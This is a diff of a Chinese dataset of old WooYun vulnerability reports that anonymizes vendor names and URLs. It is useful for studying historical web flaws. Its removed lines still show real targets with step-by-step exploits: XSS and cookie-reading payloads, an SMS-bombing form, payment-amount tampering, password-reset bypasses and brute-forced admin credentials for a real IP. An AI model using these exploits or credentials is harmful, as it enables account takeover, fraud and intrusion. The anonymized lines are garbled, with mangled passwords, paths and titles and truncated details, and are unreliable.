-### [wooyun-2012-05126] 直接读取QQ网盘信息（无需独立密码）
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2012-05126] 直接读取某互联网公司网盘信息（无需独立密码）
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 认证接口
 
@@ -21665,9 +21665,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 用过QQ网盘的人都知道，如果设置在QQ网盘上设置密码之后，每次启动QQ网盘是需要输入密码才可以进入的。但是，如果用手机登录（因为手机QQ浏览器一般都设置了自动登录，无需再输入QQ密码），直接就可以读取到网盘的信息。危害：如果手机丢失，坏淫们会读取到你QQ网盘内存放的各种密码、看到各种妹子照片呀等等。。
+**详情**: 用过某互联网公司网盘的人都知道，如果设置在某互联网公司网盘上设置密码之后，每次启动某互联网公司网盘是需要输入密码才可以进入的。但是，如果用手机登录（因为手机某互联网公司浏览器一般都设置了自动登录，无需再输入某互联网公司密码），直接就可以读取到网盘的信息。危害：如果手机丢失，坏淫们会读取到你某互联网公司网盘内存放的各种密码、看到各种妹子照片呀等等。。
 
-**POC**: 首先，打开手机QQ浏览器。然后，向右滑动，进入“云U盘”。此时可以看到“QQ网盘”出现，继续点击进入。无需密码，直接可以看到里面的文件。。
+**POC**: 首先，打开手机某互联网公司浏览器。然后，向右滑动，进入“云U盘”。此时可以看到“某互联网公司网盘”出现，继续点击进入。无需密码，直接可以看到里面的文件。。
 
 **绕过**: 直接利用
 
@@ -21689,7 +21689,7 @@
 
 **详情**: 由于opera在实现data uri协议的时候不指定mediatype也是一个合法的data url,导致我们可以在parameters处做url欺骗.
 
-**POC**: <script>function poc(){var w=open('data:;//view.news.qq.com/zt2012/modern_times/index.htm#1,2');setTimeout(function(){w.document.body.innerHTML='sogili hehehe';},100)}</script><button onclick=poc();>clickme</button>
+**POC**: <script>function poc(){var w=open('data:;//view.news.某互联网公司.com/zt2012/modern_times/index.htm#1,2');setTimeout(function(){w.document.body.innerHTML='sogili hehehe';},100)}</script><button onclick=poc();>clickme</button>
 
 **绕过**: 直接利用
 
@@ -21733,11 +21733,11 @@
 
 **详情**: 计算机学会会员用户随意修改form数据，低价充会员费
 
-**POC**: 1.打开http://web.ccf.org.cn/cas/login缴费页面，用户登录，选择“缴纳CCF会费”2.	进入页面，缴费年限选择5年，缴费方式选择“支付宝”3.进入提交，页面，使用Chrome，打开“开发者工具”，修改金额为任意的数值，比如“1”4.点击“确认支付”，此时跳转到支付宝收银台，注意右上角的金额就为1元了，此时进行支付，一切顺利。5.我支付了1元，现在可以看一下我的缴费记录。而我的失效日期顺延了5年。也就是我只花了1元，却顺延了5年的会员有效期,此漏洞即为危险，因为涉及到会员开发票的问题。
+**POC**: 1.打开https://example.com/[已脱敏]	进入页面，缴费年限选择5年，缴费方式选择“某电商平台”3.进入提交，页面，使用Chrome，打开“开发者工具”，修改金额为任意的数值，比如“1”4.点击“确认支付”，此时跳转到某电商平台收银台，注意右上角的金额就为1元了，此时进行支付，一切顺利。5.我支付了1元，现在可以看一下我的缴费记录。而我的失效日期顺延了5年。也就是我只花了1元，却顺延了5年的会员有效期,此漏洞即为危险，因为涉及到会员开发票的问题。
 
 **绕过**: 直接利用
 
-**修复**: 添加缴费成功以后的校验或者对传入支付宝的参数进行处理。
+**修复**: 添加缴费成功以后的校验或者对传入某电商平台的参数进行处理。
 ---
 
 ---
@@ -21841,7 +21841,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: # http://my.fund123.cn主页登录时，测试了中国TOP500的姓名拼音，密码123456，成功了32个，进入账号可以对个人信息、基金信息、米币信息做查看与修改，换个更大的字典的话可以成功更多，账号的校验较弱。首页跑账号，1000多的是成功的试着登录几个可以对基金做查看、删除、添加基金交易等等操作。
+**详情**: # https://example.com/[已脱敏]
 
 **POC**: #个人信息泄露：#基金信息泄露：
 
@@ -21863,7 +21863,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.xj169.com
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 将3000都改为100将3000都改为100得到票了！
 
@@ -21873,8 +21873,8 @@
 ---
 
 ---
-### [wooyun-2011-03293] 异地过QQ二代密保三个问题验证
-**厂商**: 腾讯 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2011-03293] 异地过某互联网公司二代密保三个问题验证
+**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 认证接口, 上传功能
 
@@ -21885,9 +21885,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 大家都知道异地登录QQ后 有二代密保的 如果直接修改密码 会提示输入三个验证问题才可以修改  因为这是大家不在相同的ip段上面登录的限制  那么如果我们社工到了资料 知道了一个问题的答案  但是其它两个问题没法获得 那我们就没法知道我们知道的答案是否正确 也就是无法单独验证答案的对错那么 我们打开QQ面板的消息管理器  找到以前的 或者QQ里面的陌生人 （没有联系人 可以加自己的QQ）然后点击查看聊天记录好了  会提示大家验证密保问题  但是问题只有一个  而且经过测试 是可以反复输入  而不会有输入限制   那么大家就可以测试自己社来的资料了  而且重新点击上传消息记录后 会自动更换问题  单个测试 相对于安全中心的三个问题来说 简单多了吧
+**详情**: 大家都知道异地登录某互联网公司后 有二代密保的 如果直接修改密码 会提示输入三个验证问题才可以修改  因为这是大家不在相同的ip段上面登录的限制  那么如果我们社工到了资料 知道了一个问题的答案  但是其它两个问题没法获得 那我们就没法知道我们知道的答案是否正确 也就是无法单独验证答案的对错那么 我们打开某互联网公司面板的消息管理器  找到以前的 或者某互联网公司里面的陌生人 （没有联系人 可以加自己的某互联网公司）然后点击查看聊天记录好了  会提示大家验证密保问题  但是问题只有一个  而且经过测试 是可以反复输入  而不会有输入限制   那么大家就可以测试自己社来的资料了  而且重新点击上传消息记录后 会自动更换问题  单个测试 相对于安全中心的三个问题来说 简单多了吧
 
-**POC**: 这里以一个QQ为例：安全中心改密码 需要三个问题：而在消息管理器中 只需要一个问题 就可以测试了：
+**POC**: 这里以一个某互联网公司为例：安全中心改密码 需要三个问题：而在消息管理器中 只需要一个问题 就可以测试了：
 
 **绕过**: 直接利用
 
@@ -21918,7 +21918,7 @@
 
 ---
 ### [wooyun-2015-0157507] 亲宝宝Android客户端任意账户密码重置
-**厂商**: http://www.qbb6.com/ | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+**厂商**: https://example.com/[已脱敏] | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 认证接口
 
@@ -21939,8 +21939,8 @@
 ---
 
 ---
-### [wooyun-2014-084515] 中国联通某省套餐购买逻辑漏洞+订单泄露
-**厂商**: 中国联通 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2014-084515] 某运营商某省套餐购买逻辑漏洞+订单泄露
+**厂商**: 某运营商 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -21951,7 +21951,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 套餐购买地址：http://app.weixin.gzuni.com/z/liantong/order/free?gid=49&agency_id=00002截包修改订单价格：查看订单地址：http://epay.woigz.cn/z/liantong/order/view?agency_id=00002&order_num=WD2014112416445768根据order_num查看订单，而order_num为年月日+时间，可遍历，根据返回长度判断，部分返回服务器绝对路径：
+**详情**: 套餐购买地址：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -21975,7 +21975,7 @@
 
 **详情**: 
 
-**POC**: <form action="https://www.google.com/csi" target="xx" method="post" onsubmit="setTimeout('d()', 11);" id="c"><input type="submit">a</input></form><script>function d(){var k = window.open("java		script:document.write(4)", "xx");}</script>
+**POC**: <form action="https://example.com/[已脱敏]" target="xx" method="post" onsubmit="setTimeout('d()', 11);" id="c"><input type="submit">a</input></form><script>function d(){var k = window.open("java		script:document.write(4)", "xx");}</script>
 
 **绕过**: 直接利用
 
@@ -22027,8 +22027,8 @@
 ---
 
 ---
-### [wooyun-2012-07020] 新浪微博桌面音乐盒设计缺陷导致崩溃
-**厂商**: 新浪 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2012-07020] 某社交平台某社交平台桌面音乐盒设计缺陷导致崩溃
+**厂商**: 某社交平台 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 认证接口
 
@@ -22039,7 +22039,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 登录新浪微博桌面客户端后 打开微博桌面音乐盒 在没有选定是哪首歌曲时直接拉进播放进度到后面 导致微博桌面程序崩溃。不懂报哪 只好往这上报了。漏洞证明是通过截取上报的错误信息数据包获取的。
+**详情**: 登录某社交平台某社交平台桌面客户端后 打开某社交平台桌面音乐盒 在没有选定是哪首歌曲时直接拉进播放进度到后面 导致某社交平台桌面程序崩溃。不懂报哪 只好往这上报了。漏洞证明是通过截取上报的错误信息数据包获取的。
 
 **POC**: POST /imReport/winweibo HTTP/1.1Host: report.im.weibo.comAccept: */*Content-Length: 64229Expect: 100-continueContent-Type: multipart/form-data; boundary=----------------------------7c32c2f663d6HTTP/1.1 100 Continue......................................................................................
 
@@ -22061,7 +22061,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 前段时间看好了个域名，准备注册，就下了订单，但是没付款。过了两天查询Whois发现已经被注册了，但是也是提交了该订单并付款。接着问他就出现了...可以看到域名确实是没注册成功，钱退了回来。但是却免费得到了云邮箱。然后去“邮箱管理”查看于是点击了“邮箱域名自动解析”打开“http://mail.jn05.com/”试一试，结果可以访问，是一个SmarterMail企业版（至今没登陆进去）不过我发现了另一个登陆地址“http://mail.hichina.com/”用万网邮箱的设置登陆：呵呵，没得说啦，登陆成功，而且确实是邮箱管理员权限，添加了个用户测试了下。点击“进入邮箱”，发送一封邮件试试。很完美的收到了，呵呵。可以伪造任意邮箱还发现个好玩的，可以劫持万网云邮箱系统向外发送的邮件
+**详情**: 前段时间看好了个域名，准备注册，就下了订单，但是没付款。过了两天查询Whois发现已经被注册了，但是也是提交了该订单并付款。接着问他就出现了...可以看到域名确实是没注册成功，钱退了回来。但是却免费得到了云邮箱。然后去“邮箱管理”查看于是点击了“邮箱域名自动解析”打开“https://example.com/[已脱敏]
 
 **POC**: 见上
 
@@ -22093,8 +22093,8 @@
 ---
 
 ---
-### [wooyun-2013-037003] QQ旋风最新版多处DLL劫持漏洞
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-037003] 某互联网公司旋风最新版多处DLL劫持漏洞
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -22105,7 +22105,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 测试时QQ旋风默认安装路径C:\Program Files\Tencent\QQDownloadQQDownload.exe运行时会加载五处不存在的DLL文件分别为：C:\Program Files\Tencent\QQDownload\addons\miner.dllC:\Program Files\Tencent\QQDownload\ieframe.dllC:\Program Files\Tencent\QQDownload\qqdownloadchs.dllC:\Program Files\Tencent\QQDownload\qqdownloadcht.dllC:\Program Files\Tencent\QQDownload\qqdownloadloc.dll只要相应的目录下放入对应名称的DLL文件，就会运行QQDownload.exe的同时会加载对应的DLL。（我这里在指定
+**详情**: 测试时某互联网公司旋风默认安装路径C:\Program Files\Tencent\某互联网公司Download某互联网公司Download.exe运行时会加载五处不存在的DLL文件分别为：C:\Program Files\Tencent\某互联网公司Download\addons\miner.dllC:\Program Files\Tencent\某互联网公司Download\ieframe.dllC:\Program Files\Tencent\某互联网公司Download\某互联网公司downloadchs.dllC:\Program Files\Tencent\某互联网公司Download\某互联网公司downloadcht.dllC:\Program Files\Tencent\某互联网公司Download\某互联网公司downloadloc.dll只要相应的目录下放入对应名称的DLL文件，就会运行某互联网公司Download.exe的同时会加载对应的DLL。（我这里在指定
 
 **POC**: (见原文)
 
@@ -22116,7 +22116,7 @@
 
 ---
 ### [wooyun-2014-052799] 新版千牛的旺旺可以登录被封账户
-**厂商**: 淘宝网 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
+**厂商**: 某电商平台网 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 认证接口
 
@@ -22149,7 +22149,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 网站：https://www.tzydb.com/1.随意注册账号我注册了一个小于6位的admin你们到系统查下2.找回密码处邮箱泄露在提交时泄露邮箱3.任意重置密码提交找回密码修改邮箱地址可以发现新的邮箱收到了重置邮件4.短信轰炸  测试存在该漏洞5.任意手机账号注册  验证码为4位，有效期3分钟，验证处无别的验证码导致可爆破，任意注册
+**详情**: 网站：https://example.com/[已脱敏]  测试存在该漏洞5.任意手机账号注册  验证码为4位，有效期3分钟，验证处无别的验证码导致可爆破，任意注册
 
 **POC**: 同上
 
@@ -22215,7 +22215,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://58.245.254.229/edms/index.php
+**详情**: http://[IP已脱敏]
 
 **POC**: admin  123123
 
@@ -22237,7 +22237,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 地址：http://m.flyertrip.com/index.php/Admin/Login/login.html虽然有一个验证码的框但是用不了 直接输用户名和密码就行了用burp爆破用户admin的密码爆破的结果为qq123456登录看看成功进入
+**详情**: 地址：https://example.com/[已脱敏] 直接输用户名和密码就行了用burp爆破用户admin的密码爆破的结果为某互联网公司123456登录看看成功进入
 
 **POC**: 如上
 
@@ -22259,7 +22259,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 用户注册的地方：http://www.rufengda.com/page/user/user_register.jsp选择用手机注册，点击免费获取验证码，发现在response里存在验证码，导致可以任意手机号注册。同时该接口未做限制，可导致短信轰炸。
+**详情**: 用户注册的地方：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -22281,7 +22281,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 走一波邮箱密码重置流程得到一个直接重置密码的接口POST http://www.laiqian.com/index.php?r=zusers/ChangePW HTTP/1.1Host: www.laiqian.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://www.
+**详情**: 走一波邮箱密码重置流程得到一个直接重置密码的接口POST https://example.com/[已脱敏] HTTP/1.1Host: www.laiqian.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://www.
 
 **POC**: 如上
 
@@ -22305,7 +22305,7 @@
 
 **详情**: 这个漏洞在很多网站都存在，逻辑错误不过现在少很多了，你们怎么还没有跟上步伐！
 
-**POC**: 我们打开官方网站http://www.ulearning.cn/ulearning_web/user/login.do，注册一个帐号，在修改资料处填上邮箱手机号码，保存然后退出，我们来到登录密码处，点击忘记密码，找回方式自选，我就用邮箱来找回吧，输入邮箱地址和验证码，打开burp抓包点击下一步，我们可以看到，在response中，直接返回了帐号资料和密码，密码是MD5加密的，我设置的密码是z12345678 ，现在拿着这个MD5去解密，可以看到密码解出来是z12345678我就不拿案例了吧，这么显而意见的。。。。。。。
+**POC**: 我们打开官方网站https://example.com/[已脱敏] ，现在拿着这个MD5去解密，可以看到密码解出来是z12345678我就不拿案例了吧，这么显而意见的。。。。。。。
 
 **绕过**: 直接利用
 
@@ -22369,7 +22369,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 下载地址：http://www.cmbchina.com/pbankweb/download.htmhttp://szdl.cmbchina.com/download/PBBS/PBBusinessSetup.exe下载的时候默认的地址是C:\WINDOWS\system32\PBBusinessPortal.exeC:\WINDOWS\system32\PersonalBankPortal.exe软件运行时加载这个dll文件gdinitlib.dll
+**详情**: 下载地址：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -22435,7 +22435,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://115.236.102.90/bin.rar这有个bin目录 dll 文件包未删除果断下载下来然后反编译一下可能了一下是核心代码  包涵数据层 业务逻辑层 对象实体层 等等重要代码
+**详情**: http://[IP已脱敏] dll 文件包未删除果断下载下来然后反编译一下可能了一下是核心代码  包涵数据层 业务逻辑层 对象实体层 等等重要代码
 
 **POC**: 没有仔细读代码， 说不定还能发现几处可利用的地方。 感觉挺重要的....
 
@@ -22446,7 +22446,7 @@
 
 ---
 ### [wooyun-2013-045692] DNF存在多种本地内存修改漏洞
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -22467,8 +22467,8 @@
 ---
 
 ---
-### [wooyun-2012-04190] 阿里云(aliyun)帐户系统逻辑漏洞
-**厂商**: 阿里巴巴 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2012-04190] 某电商平台(aliyun)帐户系统逻辑漏洞
+**厂商**: 某电商平台 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -22481,7 +22481,7 @@
 
 **详情**: 问题出现在忘记密码处，可以通过手机找回和邮箱找回密码两种方式获得指定帐户的新密码设置权限
 
-**POC**: 进入忘记密码，填写想要获取权限帐号的ID获得url:https://account.aliyun.com/forget/findAccount.htm?profile=blueforyou%40aliyun.com-profile-1327128258196715需要牢记（blueforyou%40aliyun.com-profile-1327128258196715）很重要选择邮箱找回或手机找回均可获得url:https://account.aliyun.com/forget/email.htm?profile=blueforyou%40aliyun.com-profile-13271282
+**POC**: 进入忘记密码，填写想要获取权限帐号的ID获得url:https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -22589,9 +22589,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 通过替换支付订单号的方式，来完成花小钱买大东西。同时生成两个订单号，一个贵的一个便宜，首先支付便宜的，银行往回返回的时候，替换订单号，然后就可以完成两个订单的同时支付。看视频吧：链接：http://pan.baidu.com/s/1i39hKNF 密码：dri8
+**详情**: 通过替换支付订单号的方式，来完成花小钱买大东西。同时生成两个订单号，一个贵的一个便宜，首先支付便宜的，银行往回返回的时候，替换订单号，然后就可以完成两个订单的同时支付。看视频吧：链接：https://example.com/[已脱敏] 密码：dri8
 
-**POC**: 证明放在私下的视频中，3天之后会自动删除。链接：http://pan.baidu.com/s/1i39hKNF 密码：dri8
+**POC**: 证明放在私下的视频中，3天之后会自动删除。链接：https://example.com/[已脱敏] 密码：dri8
 
 **绕过**: 直接利用
 
@@ -22643,7 +22643,7 @@
 ---
 
 ---
-### [wooyun-2015-0138205] 超级课程表某主营业务逻辑缺陷导致全体用户真实姓名手机和QQ隐私泄露
+### [wooyun-2015-0138205] 超级课程表某主营业务逻辑缺陷导致全体用户真实姓名手机和某互联网公司隐私泄露
 **厂商**: super.cn | **年份**: 2015 | **类型**: 敏感信息泄露
 
 **元思考**: 触发信号: 功能测试
@@ -22655,9 +22655,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 超级社团是超级课程表主营业务，截止至目前已有4万多个社团加入。主要功能之一就是：方便用户寻找社团内其他用户的联系方式，包括QQ和手机号码和短号，其中还包括用户的院系和社团名称和社团职位等信息，这些信息对于社团内部成员来说是公开的，但对于社团外的人来说，这便是隐私。进入超级社团后有一个大大的按钮——“导出通讯录”链接格式如下：http://club.super.cn/Excel/exportClubContacts.xls?clubId=&clubPeriodId=经简单研究发现clubId为社团id，clubPeriodId为社团周期id。当一个社团被新建时，clubId自增，clubPeriodId也自增。当一个社团被删除时，clubId自减，clubPeriodId不变。更多详细规则，就不在此阐述，直接上POC，以下是获取获取正确的clubId和clubPeriodId对应关系的代码（
+**详情**: 超级社团是超级课程表主营业务，截止至目前已有4万多个社团加入。主要功能之一就是：方便用户寻找社团内其他用户的联系方式，包括某互联网公司和手机号码和短号，其中还包括用户的院系和社团名称和社团职位等信息，这些信息对于社团内部成员来说是公开的，但对于社团外的人来说，这便是隐私。进入超级社团后有一个大大的按钮——“导出通讯录”链接格式如下：https://example.com/[已脱敏]
 
-**POC**: http://club.super.cn/Excel/exportClubContacts.xls?clubId=28027&clubPeriodId=29029http://club.super.cn/Excel/exportClubContacts.xls?clubId=23784&clubPeriodId=24699
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -22677,9 +22677,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 用户登录处可暴力破解http://www.bizcn.com/login?module=memberzonePOST /login HTTP/1.1Host: www.bizcn.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://www.bizcn.com/login?module=memberzoneCookie: ptrsrv=48
+**详情**: 用户登录处可暴力破解https://example.com/[已脱敏] /login HTTP/1.1Host: www.bizcn.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: https://example.com/[已脱敏] ptrsrv=48
 
-**POC**: 用户登录处可暴力破解http://www.bizcn.com/login?module=memberzonePOST /login HTTP/1.1Host: www.bizcn.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+**POC**: 用户登录处可暴力破解https://example.com/[已脱敏] /login HTTP/1.1Host: www.bizcn.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
 
 **绕过**: 直接利用
 
@@ -22743,7 +22743,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1、先决条件，APK反编译，不再阐述。2、反编译读代码，发现搜狗号码通手机客户端和服务器通讯采用了AES ECB模式加密，并且密钥有点偷懒，为产品英文的截取字符。3、核心服务器通讯有query_number.php和upload_number.php。前者为查询是否为有问题的手机号码，以及手机号码的举报次数；后者则为举报号码到骚扰电话库4、upload_number.php对IMEI参数校验不严，攻击者可以利用伪造的imei在短时间内大批量举报任意号码到骚扰电话库，并且集中对某号码恶意刷票，从而导致受害者在不知情情况下被恶意标记。5、标记功能没有教育好用户，用户有可能会误用为日常用户身份的标记，从而导致类似QQ圈子的隐私泄露。
+**详情**: 1、先决条件，APK反编译，不再阐述。2、反编译读代码，发现搜狗号码通手机客户端和服务器通讯采用了AES ECB模式加密，并且密钥有点偷懒，为产品英文的截取字符。3、核心服务器通讯有query_number.php和upload_number.php。前者为查询是否为有问题的手机号码，以及手机号码的举报次数；后者则为举报号码到骚扰电话库4、upload_number.php对IMEI参数校验不严，攻击者可以利用伪造的imei在短时间内大批量举报任意号码到骚扰电话库，并且集中对某号码恶意刷票，从而导致受害者在不知情情况下被恶意标记。5、标记功能没有教育好用户，用户有可能会误用为日常用户身份的标记，从而导致类似某互联网公司圈子的隐私泄露。
 
 **POC**: 1、通过实验，我自己的手机号已经刷到被102人举报为“快递”电话了。（求还原！）2、标签功能导致的信息泄露（但这个图的电话有问题，怀疑也是和本人一样绕过手机端进行测试的）
 
@@ -22797,8 +22797,8 @@
 ---
 
 ---
-### [wooyun-2012-05683] 腾讯微信短信轰炸
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2012-05683] 某互联网公司某互联网公司短信轰炸
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -22809,9 +22809,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 微信虽然做了针对号码的频率限制，但未对发送者发送频率做限制，即被拦截后还可以发给下一个手机，继续轰炸 = =
+**详情**: 某互联网公司虽然做了针对号码的频率限制，但未对发送者发送频率做限制，即被拦截后还可以发给下一个手机，继续轰炸 = =
 
-**POC**: 构造表单：<form method="post" action="http://weixin.qq.com/cgi-bin/downloadurl?t=weixin_getdownurl_sms&s=send&check=false"><input type="hidden" name="country" value="+86" /><input type="text" name="phone" /><input type="submit" /></form>提交即可
+**POC**: 构造表单：<form method="post" action="https://example.com/[已脱敏]"><input type="hidden" name="country" value="+86" /><input type="text" name="phone" /><input type="submit" /></form>提交即可
 
 **绕过**: 直接利用
 
@@ -22820,7 +22820,7 @@
 
 ---
 ### [wooyun-2015-099659] Discuz X3.2 论坛逻辑漏洞可绕过支付虚拟币查看帖子内敏感内容
-**厂商**: 腾讯 | **年份**: 2015 | **类型**: 敏感信息泄露
+**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: 敏感信息泄露
 
 **元思考**: 触发信号: 功能测试
 
@@ -22833,7 +22833,7 @@
 
 **详情**: No code(未写爬虫代码，因为还有更简单利用方式）利用方式就是用Tools，模拟的搜索引擎针对国内社工库论坛，绕过金币提取内部分析的网盘链接，看漏洞证明！
 
-**POC**: 被利用例子：http://www.cnse.pro/forum.php?mod=viewthread&tid=33&extra=page%3D1参与利用工具(Tools工具）：http://s.tool.chinaz.com/tools/robot.aspx原理：改User-Agent为：User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)模拟蜘蛛截图：某社工库论坛爬取链接：上图没有看到密码，是因为，内部又设置了【回复可见】，必须回复才能继续，，当然，如果发
+**POC**: 被利用例子：https://example.com/[已脱敏] Mozilla/5.0 (compatible; Baiduspider/2.0; +https://example.com/[已脱敏])模拟蜘蛛截图：某社工库论坛爬取链接：上图没有看到密码，是因为，内部又设置了【回复可见】，必须回复才能继续，，当然，如果发
 
 **绕过**: 过滤绕过
 
@@ -22853,9 +22853,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 地址：http://yy.teatree.cn/vip/在VIP里，购买的时候，拦截下来HTTP请求，修改金额参数~情况1：修改不是负数的时候，需要登录支付~然后支付成功~情况2：金额修改成负数的时候，直接支付成功~在进去一看，哎呀，成VIP了~
+**详情**: 地址：https://example.com/[已脱敏]
 
-**POC**: 地址：http://yy.teatree.cn/vip/在VIP里，购买的时候，拦截下来HTTP请求，修改金额参数~请求参数：hdfZongMoney=150.00  修改成 hdfZongMoney=0.01情况1：修改不是负数的时候，需要登录支付~然后支付成功~情况2：金额修改成负数的时候，直接支付成功~请求参数：hdfZongMoney=1000.00  修改成 hdfZongMoney=-1在进去一看，哎呀，成VIP了~
+**POC**: 地址：https://example.com/[已脱敏]  修改成 hdfZongMoney=0.01情况1：修改不是负数的时候，需要登录支付~然后支付成功~情况2：金额修改成负数的时候，直接支付成功~请求参数：hdfZongMoney=1000.00  修改成 hdfZongMoney=-1在进去一看，哎呀，成VIP了~
 
 **绕过**: 直接利用
 
@@ -22877,7 +22877,7 @@
 
 **详情**: 遨游浏览器一个external接口函数没有遵循同源策略，存在一个跨域脚本漏洞。漏洞函数external.max_newTab（），函数的功能是打开一个新的标签页。该函数存在一个时间竞争条件错误，可以突破同源策略跨域操作窗口对象，跨域执行任意脚本。同时遨游浏览器自定义开发的external接口函数设定了一个信任域，该信任域包括*.maxthon.cn等，结合*.maxthon.cn任意web应用的一个脚本漏洞就可以调用漏洞函数external.max_newTab（）执行跨域操作。
 
-**POC**: POC：1. passport.maxthon.cn存在一个跨站脚本漏洞，通过跨站脚本漏洞可以调用漏洞函数，嵌入一个远程的js http://127.0.0.1/vul.jshttp://passport.maxthon.cn/new/register_account.html?account="><script/src=http://127.0.0.1/vul.js></script>2.调用漏洞函数的javascript脚本hijack_code = "alert(document.cookie);document.write('hacked by rayh4c#80sec.com')"t
+**POC**: POC：1. passport.maxthon.cn存在一个跨站脚本漏洞，通过跨站脚本漏洞可以调用漏洞函数，嵌入一个远程的js http://[IP已脱敏] = "alert(document.cookie);document.write('hacked by rayh4c#80sec.com')"t
 
 **绕过**: 直接利用
 
@@ -22897,7 +22897,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 爱卡办公系统http://bangong.xcar.com.cn/Admin/index.php?s=/Public/login首次访问没有验证码，尝试登陆失败一次后，会出现验证码第一次尝试爆破的时候，抓取没有验证码的登陆请求，会提示必须输入验证码
+**详情**: 爱卡办公系统https://example.com/[已脱敏]
 
